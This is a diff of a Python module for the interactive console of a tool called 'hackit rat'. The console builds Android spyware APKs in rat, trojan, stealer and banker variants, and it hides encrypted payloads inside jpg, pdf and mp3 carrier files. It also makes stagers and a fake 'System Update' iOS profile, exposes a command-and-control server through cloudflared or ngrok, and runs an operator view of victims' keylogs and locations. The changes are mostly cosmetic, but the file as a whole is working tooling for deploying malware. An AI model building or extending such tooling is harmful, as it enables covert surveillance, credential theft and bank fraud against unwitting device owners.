@@ -1,18 +1,21 @@
-"""Bare `hackit rat` surface: banner, help, then an input loop with no flags.
+"""Bare `hackit rat` surface: banner, status, then a verb loop with no flags.
 
-The loop is the product: `make apk`, `make file`, `make ios`, `make stager`,
-`run`. Anything typed that is not a verb is treated as a verb argument, so
-`make apk` and `make apk agent.apk` both work without a parser.
+The loop is the product: `make app`, `make file`, `inject`, `run`. Anything
+typed that is not a verb is treated as a verb argument, so `make app` and
+`make app myapp malware` both work without a parser. Layout is fixed-width so
+columns never drift, and every long value is truncated to the pane instead of
+wrapping over its neighbour.
 """
 from __future__ import annotations
 
 import json
 import os
+import re
 from typing import List, Optional
 
-from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, B_YELLOW, DIM, GREEN, RED, YELLOW
+from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN, RED, YELLOW
 
-from . import builder, ios, polyglot, samples, server, store, ui
+from . import builder, ios, polyglot, samples, sdk, server, store, term, ui
 
 BANNER = "\n".join(
     [
@@ -42,21 +45,47 @@ BANNER = "\n".join(
     ]
 )
 
-HELP: List[tuple] = [
-    ("inject <spec> <file>", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk)"),
-    ("make app [name] [spec]", "build the APK (spec: rat/trojan/spyware/malware/stealer/banker/bot)"),
-    ("make installer [spec]", "offline USB installer: APK + setup.bat + setup.sh"),
-    ("make file <ext> [carrier]", "hide the APK in one carrier format"),
-    ("make stager [host]", "one-command installer + landing page + iOS profile"),
-    ("make ios [url]", "WebClip profile + PWA link for iPhone"),
-    ("run", "live operator UI (sessions, feed, keylog, location)"),
-    ("tunnel [provider]", "expose the C2 publicly (cloudflared/ngrok/ssh)"),
-    ("sessions", "list known devices"),
-    ("doctor", "toolchain readiness"),
-    ("help / clear / quit", "this list / clear screen / leave"),
+# (section, [(verb, description)]). Verbs stay typeable verbatim; the index is
+# only a shortcut so the rail reads as a menu instead of a wall.
+MENU: List[tuple] = [
+    ("BUILD", [
+        ("make app <name> [spec]", "compile a signed APK (auto-installs the SDK)"),
+        ("make installer [spec]", "offline USB installer: APK + setup.bat + setup.sh"),
+        ("make file <ext> [carrier]", "hide the APK in one carrier format"),
+        ("make stager [host]", "installer + landing page + iOS profile"),
+        ("make ios [url]", "WebClip profile + PWA link for iPhone"),
+    ]),
+    ("INJECT", [
+        ("inject <spec> <file>", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk)"),
+    ]),
+    ("OPERATE", [
+        ("run", "live operator UI (devices, feed, keylog, location)"),
+        ("tunnel [provider]", "expose the C2 publicly (cloudflared/ngrok/ssh)"),
+        ("sessions", "list known devices"),
+    ]),
+    ("SYSTEM", [
+        ("doctor", "toolchain readiness"),
+        ("setup", "install JDK-adjacent toolchain + SDK (once)"),
+        ("help / clear / quit", "this list / clear screen / leave"),
+    ]),
 ]
 
+SHORTCUTS = {
+    "1": "make app agent rat",
+    "2": "make installer",
+    "3": "make file",
+    "4": "make stager",
+    "5": "make ios",
+    "6": "inject",
+    "7": "run",
+    "8": "tunnel",
+    "9": "sessions",
+    "0": "help",
+}
+
+SPECS = "rat · trojan · spyware · malware · stealer · banker · bot · minimal"
 CONFIG_PATH = os.path.join(store.ROOT, "agent.json")
+MAX_NAME = 48
 
 
 def _host_from_config() -> Optional[str]:
@@ -81,6 +110,7 @@ def _ensure_config(spec: str = "rat") -> dict:
             return existing
         except (OSError, ValueError):
             pass
+    print(term.Dim + "  no config yet — two fields, then it stops asking." + term.RESET)
     host = input(_colored("  C2 host (https://host): ", B_GREEN)).strip()
     if not host:
         raise SystemExit(_colored("  host required", RED))
@@ -90,7 +120,7 @@ def _ensure_config(spec: str = "rat") -> dict:
     with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
         json.dump(config, handle, indent=2)
     os.chmod(CONFIG_PATH, 0o600)
-    print(_colored(f"  config  {CONFIG_PATH}", DIM))
+    print(term.label("config", 11) + term.Dim + CONFIG_PATH + term.RESET)
     return config
 
 
@@ -115,14 +145,44 @@ def _latest_apk() -> Optional[str]:
     return max(candidates)[1] if candidates else None
 
 
+def _safe_name(name: str) -> str:
+    clean = re.sub(r"[^A-Za-z0-9._-]", "-", name.strip())
+    return clean or "agent"
+
+
 def _build_apk(name: str = "agent", spec: str = "rat") -> str:
+    spec = (spec or "rat").lower()
+    if spec not in builder.SPECS:
+        print(term.Bad + f"  unknown spec {spec!r} — choose {SPECS}" + term.RESET)
+        spec = "rat"
+    name = _safe_name(name)[:MAX_NAME]
     config = _ensure_config(spec)
     out = os.path.join(store.ROOT, "dist", name if name.endswith(".apk") else name + ".apk")
-    return builder.build(config, engine="auto", release=True, out=out)
+    print()
+    print(term.Title + "  BUILD" + term.RESET)
+    print(term.label("spec", 11) + term.Bright + spec + term.RESET)
+    print(term.label("label", 11) + term.Bright + str(config.get("label", "android")) + term.RESET)
+    print(term.label("host", 11) + term.Dim + str(config.get("host", "")) + term.RESET)
+    print(term.label("toolchain", 11) + term.Dim
+          + ("ready" if sdk.find() else "absent — installing automatically") + term.RESET)
+    path = builder.build(config, engine="auto", release=True, out=out)
+    size = os.path.getsize(path)
+    print()
+    for line in term.box(
+        "APK READY",
+        [
+            term.Green if False else term.Good + "  " + os.path.basename(path) + term.RESET,
+            term.Dim + f"  {size:,} bytes · spec {spec}" + term.RESET,
+            term.Dim + "  adb install -r " + path + term.RESET,
+        ],
+        64,
+        term.Good,
+    ):
+        print("  " + line)
+    return path
 
 
 def _resolve_carrier(target: str) -> Optional[str]:
-    """Find a carrier file: absolute path, cwd, or common user folders."""
     target = target.strip("\"'")
     if not target:
         return None
@@ -143,37 +203,39 @@ def _resolve_carrier(target: str) -> Optional[str]:
 def _inject(spec: str, target: str) -> None:
     """inject <spec> <file> — hide the payload inside `target` (or make one)."""
     if spec not in builder.SPECS:
-        print(_colored(f"  unknown spec {spec!r} — {', '.join(sorted(builder.SPECS))}", YELLOW))
+        print(term.Warn + f"  unknown spec {spec!r} — {SPECS}" + term.RESET)
         return
     target = target.strip("\"'")
     ext = os.path.splitext(target)[1].lower().lstrip(".")
     if ext not in polyglot.MODES:
-        print(_colored(f"  no carrier recipe for .{ext or '?'} — {', '.join(sorted(polyglot.MODES))}", YELLOW))
+        print(term.Warn + f"  no carrier recipe for .{ext or '?'} — "
+              + ", ".join(sorted(polyglot.MODES)) + term.RESET)
         return
     apk = _latest_apk()
     if not apk:
-        print(_colored(f"  no APK yet — building one (spec: {spec})", DIM))
+        print(term.Dim + "  no APK yet — building one first" + term.RESET)
         apk = _build_apk("agent", spec)
     folder = os.path.join(store.ROOT, "dist", spec)
     os.makedirs(folder, exist_ok=True)
     source = _resolve_carrier(target)
     if source:
-        print(_colored(f"  carrier    {source}", DIM))
+        print(term.label("carrier", 11) + term.Dim + source + term.RESET)
     else:
         source = samples.sample(ext, folder)
-        print(_colored(f"  carrier sample {source} (target file not found: {target})", DIM))
+        print(term.label("carrier", 11) + term.Dim + f"sample {source}" + term.RESET)
     result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
-    print(_colored(f"  spec      {spec} · modules {', '.join(builder.SPECS[spec]) or '-'}", B_CYAN))
-    print(_colored(f"  carrier   {result.carrier}", B_GREEN))
-    print(_colored(f"  sealed    {result.size:,} bytes  sha256 {result.digest[:16]}…", DIM))
+    print(term.label("spec", 11) + term.Bright + spec + term.RESET)
+    print(term.label("carrier", 11) + term.Good + result.carrier + term.RESET)
+    print(term.label("sealed", 11) + term.Dim + f"{result.size:,} bytes · sha256 {result.digest[:16]}…"
+          + term.RESET)
     for path in result.launchers:
-        print(_colored(f"  helper    {path}", DIM))
+        print(term.label("helper", 11) + term.Dim + path + term.RESET)
 
 
 def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
     apk = _latest_apk()
     if not apk:
-        print(_colored("  no APK yet — building one", DIM))
+        print(term.Dim + "  no APK yet — building one first" + term.RESET)
         apk = _build_apk("agent")
     folder = os.path.join(store.ROOT, "dist")
     os.makedirs(folder, exist_ok=True)
@@ -181,12 +243,13 @@ def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
         source = carrier
     else:
         source = samples.sample(ext, folder)
-        print(_colored(f"  sample carrier  {source}", DIM))
+        print(term.label("sample", 11) + term.Dim + source + term.RESET)
     result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
-    print(_colored(f"  carrier   {result.carrier}", B_GREEN))
-    print(_colored(f"  payload   {result.size:,} bytes  sha256 {result.digest[:16]}…", DIM))
+    print(term.label("carrier", 11) + term.Good + result.carrier + term.RESET)
+    print(term.label("payload", 11) + term.Dim + f"{result.size:,} bytes · sha256 {result.digest[:16]}…"
+          + term.RESET)
     for path in result.launchers:
-        print(_colored(f"  helper    {path}", DIM))
+        print(term.label("helper", 11) + term.Dim + path + term.RESET)
 
 
 def _make_installer(spec: str, label: str) -> None:
@@ -198,7 +261,7 @@ def _make_installer(spec: str, label: str) -> None:
     folder = os.path.join(store.ROOT, "dist", f"installer-{installer.stamp()}")
     made = installer.build(apk, folder, spec, label or config.get("label", "agent"))
     for path in made:
-        print(_colored(f"  {path}", B_GREEN))
+        print(term.label("file", 11) + term.Good + path + term.RESET)
 
 
 def _make_stager(host: Optional[str]) -> None:
@@ -208,7 +271,7 @@ def _make_stager(host: Optional[str]) -> None:
     target = host or config["host"]
     out = stager.build(target, config, os.path.join(store.ROOT, "dist"))
     for path in out:
-        print(_colored(f"  {path}", B_GREEN))
+        print(term.label("file", 11) + term.Good + path + term.RESET)
 
 
 def _make_ios(url: Optional[str]) -> None:
@@ -217,8 +280,9 @@ def _make_ios(url: Optional[str]) -> None:
     folder = os.path.join(store.ROOT, "dist")
     os.makedirs(folder, exist_ok=True)
     path = ios.write_profile(folder, "System Update", base + "/w/" + _web_token())
-    print(_colored(f"  profile   {path}", B_GREEN))
-    print(_colored(f"  open      {base}/w/{_web_token()}/ once to register the PWA", DIM))
+    print(term.label("profile", 11) + term.Good + path + term.RESET)
+    print(term.label("open", 11) + term.Dim + f"{base}/w/{_web_token()}/ once to register the PWA"
+          + term.RESET)
 
 
 def _web_token() -> str:
@@ -235,29 +299,134 @@ def _print_sessions() -> None:
     store.init()
     rows = store.sessions()
     if not rows:
-        print(_colored("  no devices", DIM))
+        print(term.Dim + "  no devices yet — `make app`, install it, open once" + term.RESET)
         return
-    for row in rows:
+    width, _ = term.size()
+    columns = [3, 2, 8, 20, 22, 12]
+    table_rows = []
+    for index, row in enumerate(rows, 1):
         dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
-        kind = row.get("kind", "apk")
-        spec = row.get("spec", "rat")
-        print(f"  {dot} {_colored(row['sid'][:18], B_WHITE)} {_colored(spec, B_MAGENTA)} "
-              f"{_colored(kind, B_YELLOW)} {row.get('model') or '?'} {row.get('battery') or 0}%")
+        table_rows.append([
+            f"{index:>2}",
+            dot,
+            (row.get("spec") or "rat")[:8],
+            (row.get("model") or "?")[:20],
+            (row.get("sid") or "")[:22],
+            f"{row.get('battery') or 0}%{'⚡' if row.get('charging') else ''}",
+        ])
+    for line in term.table(("#", "", "spec", "model", "sid", "batt"), table_rows, columns,
+                           ["right", "center", "left", "left", "left", "right"]):
+        print("  " + term.trunc(line, width - 2))
+
+
+def _status_panel() -> List[str]:
+    width, _ = term.size()
+    inner = min(width - 4, 78)
+    sessions = 0
+    online = 0
+    apks = 0
+    try:
+        store.init()
+        rows = store.sessions()
+        sessions = len(rows)
+        online = sum(1 for row in rows if row["online"])
+        apks = sum(1 for base, _d, names in os.walk(os.path.join(store.ROOT, "build"))
+                   for name in names if name.endswith(".apk"))
+    except Exception:
+        pass
+    config = {}
+    try:
+        config = json.loads(open(CONFIG_PATH, encoding="utf-8").read())
+    except (OSError, ValueError):
+        pass
+    found = sdk.find()
+    java = sdk.java_bin("javac")
+    sdk_state = (term.Good + "ready" + term.RESET) if found else (
+        term.Bad + "missing" + term.RESET
+    )
+    java_state = (term.Good + "ok" + term.RESET) if java else (term.Bad + "missing" + term.RESET)
+    host = term.trunc(str(config.get("host") or "—"), inner - 16)
+    spec = str(config.get("spec") or "rat")
+    label_col = 8
+    rows = [
+        term.label("host", label_col) + term.Bright + host + term.RESET,
+        term.label("spec", label_col) + term.Bright + spec + term.RESET,
+        term.label("builds", label_col) + term.Dim + f"{apks} apk" + term.RESET,
+        term.label("devices", label_col) + term.Dim + f"{online} online / {sessions} known"
+        + term.RESET,
+        term.label("sdk", label_col) + sdk_state + term.Dim + f"   javac {java_state}"
+        + term.RESET,
+    ]
+    return term.box("BENCH", rows, inner, term.Frame)
+
+
+def _print_menu() -> None:
+    width, _ = term.size()
+    shortcut = 1
+    for section, rows in MENU:
+        print()
+        print("  " + term.Title + section + term.RESET)
+        for verb, desc in rows:
+            key = str(shortcut % 10) if shortcut <= 9 else "·"
+            if verb.startswith("help"):
+                key = "?"
+            print("  " + term.Dim + key.rjust(2) + term.RESET + "  "
+                  + term.pad(verb, 28) + term.trunc(desc, max(10, width - 40)))
+            shortcut += 1
+    print()
+    print("  " + term.Dim + f"specs: {SPECS}" + term.RESET)
+
+
+def _doctor() -> int:
+    print()
+    print("  " + term.Title + "TOOLCHAIN" + term.RESET)
+    return builder.doctor()
+
+
+def _setup() -> int:
+    print()
+    print("  " + term.Title + "TOOLCHAIN INSTALL" + term.RESET)
+    try:
+        root = sdk.ensure()
+    except sdk.SdkError as exc:
+        print(term.Bad + f"  [x] {exc}" + term.RESET)
+        return 1
+    print(term.Good + f"  [ok] {root}" + term.RESET)
+    return 0
+
+
+def _history() -> None:
+    try:
+        import readline
+    except ImportError:
+        return
+    readline.set_history_length(500)
+
+
+def _prompt() -> str:
+    return _colored("rat> ", B_GREEN)
 
 
 def interactive() -> None:
     store.init()
+    _history()
+    term.clear()
     print(BANNER)
+    print()
+    for line in _status_panel():
+        print("  " + line)
     if not os.path.exists(CONFIG_PATH):
-        print(_colored("  first run: host + PSK will be minted now", DIM))
+        print(term.Dim + "  first run: host + PSK will be minted on the first build" + term.RESET)
+    _print_menu()
     while True:
         try:
-            line = input(_colored("rat> ", B_GREEN)).strip()
+            line = input(_prompt()).strip()
         except (EOFError, KeyboardInterrupt):
             print()
             return
         if not line:
             continue
+        line = SHORTCUTS.get(line, line)
         parts = line.split()
         verb = parts[0].lower()
         args = parts[1:]
@@ -265,40 +434,50 @@ def interactive() -> None:
             if verb in ("quit", "exit", "q"):
                 return
             if verb in ("help", "?", "menu"):
-                for name, desc in HELP:
-                    print(f"  {_colored(name.ljust(26), B_WHITE)} {_colored(desc, DIM)}")
+                print()
+                for panel in _status_panel():
+                    print("  " + panel)
+                _print_menu()
             elif verb == "clear":
-                os.system("cls" if os.name == "nt" else "clear")
+                term.clear()
                 print(BANNER)
+                _print_menu()
             elif verb == "sessions":
+                print()
                 _print_sessions()
             elif verb == "doctor":
-                raise SystemExit(builder.doctor())
+                _doctor()
+            elif verb == "setup":
+                _setup()
             elif verb == "tunnel":
                 from . import tunnel
 
                 port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8443
                 url = tunnel.start(port, args[0] if args and not args[0].isdigit() else "auto")
                 if not url:
-                    print(_colored("  no tunnel available — install cloudflared or ngrok", YELLOW))
+                    print(term.Warn + "  no tunnel available — install cloudflared or ngrok"
+                          + term.RESET)
+                else:
+                    print(term.label("url", 11) + term.Good + url + term.RESET)
             elif verb == "run":
                 key = server.load_psk(os.path.join(store.ROOT, "psk.txt"))
                 ui.run("0.0.0.0", 8443, key, _host_from_config() or "http://127.0.0.1:8443")
             elif verb == "inject":
                 if len(args) < 1:
-                    print(_colored("  inject <spec> <file>", YELLOW))
+                    print(term.Warn + "  inject <spec> <file>" + term.RESET)
                 else:
                     _inject(args[0].lower(), args[1] if len(args) > 1 else "")
             elif verb == "make":
                 what = (args[0] if args else "").lower()
                 if what in ("apk", "app"):
-                    _build_apk(args[1] if len(args) > 1 else "agent", args[2] if len(args) > 2 else "rat")
+                    _build_apk(args[1] if len(args) > 1 else "agent",
+                               args[2] if len(args) > 2 else "rat")
                 elif what == "installer":
                     _make_installer(args[1] if len(args) > 1 else "rat", "agent")
                 elif what == "file":
                     ext = (args[1] if len(args) > 1 else "").lower().lstrip(".")
                     if ext not in polyglot.MAGICS:
-                        print(_colored(f"  choose: {', '.join(polyglot.MAGICS)}", YELLOW))
+                        print(term.Warn + f"  choose: {', '.join(polyglot.MAGICS)}" + term.RESET)
                         continue
                     _make_file(ext, args[2] if len(args) > 2 else None,
                                args[3] if len(args) > 3 else "agent")
@@ -307,12 +486,13 @@ def interactive() -> None:
                 elif what == "ios":
                     _make_ios(args[1] if len(args) > 1 else None)
                 else:
-                    print(_colored("  make apk | make file <ext> | make stager | make ios", YELLOW))
+                    print(term.Warn + "  make app | make file <ext> | make stager | make ios"
+                          + term.RESET)
             else:
-                print(_colored(f"  unknown: {verb} — help", YELLOW))
+                print(term.Warn + f"  unknown: {verb} — help" + term.RESET)
         except SystemExit:
             raise
         except KeyboardInterrupt:
             print()
         except Exception as exc:
-            print(_colored(f"  error: {exc}", RED))
+            print(term.Bad + f"  error: {exc}" + term.RESET)
